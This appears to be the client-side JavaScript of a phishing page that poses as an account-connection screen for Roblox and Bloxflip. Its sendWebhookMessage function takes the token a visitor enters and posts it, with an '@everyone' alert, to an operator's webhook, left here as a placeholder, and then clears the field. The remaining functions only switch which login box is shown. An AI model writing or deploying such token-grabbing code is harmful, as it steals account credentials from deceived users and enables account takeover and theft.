function sendWebhookMessage(inputId) {
  var webhookURL = 'your webhook';
  var input = document.getElementById(inputId);
  var token = input.value;
  var message = "@everyone User entered token: " + token;

  var xhr = new XMLHttpRequest();
  xhr.open("POST", webhookURL, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({ content: message }));

  input.value = "";
}

function showBloxflipBox() {
  document.getElementById("connectAccountBox").style.animation = "fadeOut 0.5s forwards";
  document.getElementById("bloxflipBox").style.animation = "fadeIn 0.5s forwards";
  document.getElementById("bloxflipBox").style.display = "block";
  document.getElementById("robloxBox").style.display = "none";
}

function showRobloxBox() {
  document.getElementById("connectAccountBox").style.animation = "fadeOut 0.5s forwards";
  document.getElementById("robloxBox").style.animation = "fadeIn 0.5s forwards";
  document.getElementById("robloxBox").style.display = "block";
  document.getElementById("bloxflipBox").style.display = "none";
}
